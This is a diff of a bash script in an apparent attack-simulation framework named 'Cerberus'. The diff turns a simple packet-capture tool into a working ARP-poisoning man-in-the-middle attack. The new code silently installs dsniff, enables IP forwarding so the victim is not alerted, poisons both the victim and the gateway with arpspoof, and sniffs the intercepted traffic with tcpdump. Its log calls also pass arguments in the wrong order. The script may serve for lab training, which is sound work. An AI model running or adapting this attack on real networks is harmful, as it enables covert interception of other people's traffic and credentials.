@@ -1,34 +1,67 @@
 #!/bin/bash
-# Install tcpdump if missing
-command -v tcpdump >/dev/null 2>&1 || apt-get install -y tcpdump >/dev/null 2>&1
+# CERBERUS ATTACK MODULE: ARP POISONING (MITM)
+# Requirement: "Simulation d'attaque interne (sniffing ARP)"
+
+if [ -d "/app/reports" ]; then LOG_DIR="/app/reports"; else LOG_DIR="./reports"; fi
+LOG_FILE="$LOG_DIR/audit_$(date +%F).log"
+
+log_event() {
+    TIMESTAMP=$(date -u +"%Y-%m-%dT%H:%M:%SZ")
+    echo "{\"timestamp\": \"$TIMESTAMP\", \"event_type\": \"$1\", \"severity\": \"$2\", \"target\": \"172.20.0.20\", \"message\": \"$3\", \"threat_score\": $4}" >> "$LOG_FILE"
+}
+
+# CHECK DEPENDENCIES
+# we need 'dsniff' (for arpspoof) and 'tcpdump'.
+# If missing, we install them silently to ensure the framework works.
+if ! command -v arpspoof >/dev/null 2>&1; then
+    echo "[*] Initializing Attack Tools (Installing dsniff)..."
+    apt-get update >/dev/null 2>&1 && apt-get install -y dsniff tcpdump >/dev/null 2>&1
+fi
 
 clear
 echo "========================================================"
-echo " CERBERUS NETWORK ANALYZER"
+echo " CERBERUS: INTERNAL ATTACK SIMULATION (ARP)"
 echo "========================================================"
-echo "[*] Interface: eth0"
-echo "[*] Mode:      Live Inspection"
-echo "--------------------------------------------------------"
-echo -e "\033[1;32m[!] CAPTURE STARTED. TRAFFIC WILL APPEAR BELOW.\033[0m"
-echo -e "    (Press \033[1;37mENTER\033[0m to stop the capture)"
+echo "[*] TARGET (Victim):  172.20.0.20"
+echo "[*] GATEWAY (Router): 172.20.0.1"
 echo "--------------------------------------------------------"
 
-# 1. Start tcpdump in the background (&) so it doesn't block the script
-tcpdump -i eth0 -n &
+# ENABLE IP FORWARDING
+# without this the victim loses connection and the attack is detected immediately
+echo 1 > /proc/sys/net/ipv4/ip_forward
+echo "[+] IP Forwarding Enabled (Traffic flows through us)"
 
-# 2. Capture the Process ID (PID) of the background tcpdump
-TCPDUMP_PID=$!
+# LAUNCH THE ATTACK
+echo -e "\033[1;31m[!] LAUNCHING MITM ATTACK & SNIFFER...\033[0m"
+log_event "ATTACK_START" "ARP Poisoning initiated (MITM)" "CRITICAL" 90
 
-# 3. Wait for user input (This holds the script open)
+# poison the victim
+arpspoof -i eth0 -t 172.20.0.20 172.20.0.1 > /dev/null 2>&1 &
+PID_1=$!
+
+# poison the router
+arpspoof -i eth0 -t 172.20.0.1 172.20.0.20 > /dev/null 2>&1 &
+PID_2=$!
+
+# sniff the stolen traffic
+# we only show traffic not coming from us to reduce noise
+tcpdump -i eth0 host 172.20.0.20 and not port 22 -n &
+PID_DUMP=$!
+
+echo "--------------------------------------------------------"
+echo "    [ACTIVE] Intercepting traffic..."
+echo "    Press ENTER to stop the attack and restore network."
 read -r _
 
-# 4. Kill the specific tcpdump process when Enter is pressed
-kill "$TCPDUMP_PID" > /dev/null 2>&1
-wait "$TCPDUMP_PID" 2>/dev/null
+echo "[*] Stopping Attack..."
+kill $PID_1 $PID_2 $PID_DUMP > /dev/null 2>&1
+wait $PID_DUMP 2>/dev/null
 
-echo ""
-echo "--------------------------------------------------------"
-echo "[*] CAPTURE STOPPED BY USER."
+# disable IP forwarding
+echo 0 > /proc/sys/net/ipv4/ip_forward
+
+log_event "ATTACK_STOP" "ARP Poisoning terminated. Network restored." "INFO" 0
+
+echo "[+] Network Restored. Logs saved."
 echo "========================================================"
-echo ""
-read -p "Press Enter to return to menu..."
+read -p "Press Enter to return..."
